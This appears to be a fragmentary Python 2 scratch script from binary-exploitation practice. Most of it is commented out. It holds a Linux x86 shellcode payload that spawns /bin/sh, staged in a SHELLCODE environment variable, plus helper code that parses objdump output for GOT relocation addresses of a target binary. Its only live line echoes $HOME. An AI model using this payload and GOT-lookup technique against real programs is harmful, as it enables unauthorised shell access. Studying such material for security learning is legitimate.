import os
from subprocess import Popen,PIPE,call

#os.environ["SHELLCODE"] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

#os.environ["SHELLCODE"] = "BBBB";
#print os.environ["SHELLCODE"];
#print hex(id(os.environ["SHELLCODE"]));

#output = Popen(["export","SHELLCODE=ABCD"],stdout=PIPE,close_fds=True,shell=True).communicate()[0].strip()

#print output;


#os.environ["SHELLCODE"] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

#subprocess.check_call(['sqsub', '-np', sys.argv[1], '/home/prateekj/Desktop/ResearchProject/Research/'],
#                      env=os.environ)


'''
		p1 = Popen(["objdump", "--dynamic-reloc", binary], stdout=PIPE)
		p2 = Popen(["grep", " %s$" % options.got], stdin=p1.stdout, stdout=PIPE) # Exact match RE
		p3 = Popen(["cut", "-d ", "-f1"], stdin=p2.stdout, stdout=PIPE)
		options.overwrite = int(p3.communicate()[0],16)
		log.debug("Found got address for function '%s' of binary '%s' at: %#x" % (options.got,binary,options.overwrite))
'''

'''
binaryName = os.environ["PWD"] + "/binaries/newproblem1";
p1 = Popen(["objdump", "--dynamic-reloc", binaryName], stdout=PIPE)
p2 = Popen(["cut", "-d ", "-f1"], stdin=p1.stdout, stdout=PIPE).communicate()[0]

zones = [];

for line in p2.split('\n'):
	if not line:
		continue
	zones.append(line)

del zones[0:3];

print zones;
'''


#binaryName = os.environ["PWD"] + "/binaries/newproblem1";	
#p1 = Popen(["objdump", "--dynamic-reloc", binaryName],stdout=PIPE,close_fds=True).communicate()[0].strip();
#print (p2);

cmd = 'echo $HOME'
print Popen(cmd,stdout=PIPE,close_fds=True,shell=True).communicate()[0].strip()




